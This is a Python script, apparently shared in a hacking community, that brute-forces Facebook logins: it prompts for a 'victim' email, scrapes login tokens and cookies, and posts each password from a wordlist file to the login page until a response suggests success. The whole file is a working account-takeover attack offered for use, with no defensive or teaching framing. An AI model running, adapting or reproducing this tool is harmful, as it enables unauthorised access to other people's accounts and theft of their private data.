#Modify By Illusion Demon
#Facebook Group 
#https://m.facebook.com/groups/423523842196228/


import os.path
import requests
from bs4 import BeautifulSoup
import sys

if sys.version_info[0] != 3:
    print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
    fb.py\n\t--------------------------------------''')
    sys.exit()

PASSWORD_FILE = "attack.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\n Ｐａｓｓｗｏｒｄ Ｆｏｕｎｄ:--> ', password)
        return True
    return False


if __name__ == "__main__":
    print('\n         ⭐░T░e░a░m░ ░0░0░7░ ░C░o░m░m░u░n░i░t░y░⭐           \n')
    if not os.path.isfile(PASSWORD_FILE):
        print("ₚₐₛₛwₒᵣd fᵢₗₑ ᵢₛ ₙₒₜ ₑₓᵢₛₜ ☹ ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("ᴘᴀꜱꜱᴡᴏʀᴅ ꜰɪʟᴇ ꜱᴇʟᴇᴄᴛᴇᴅ :D --> ", PASSWORD_FILE)
    email = input('ᴠɪᴄᴛɪᴍ ᴇᴍᴀɪʟ/ᴜꜱᴇʀɴᴀᴍᴇ --> ').strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("T͓̽r͓̽y͓̽ ͓̽T͓̽o͓̽ ͓̽F͓̽i͓̽n͓̽d͓̽ ͓̽P͓̽a͓̽s͓̽s͓̽w͓̽o͓̽r͓̽d͓̽[", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break
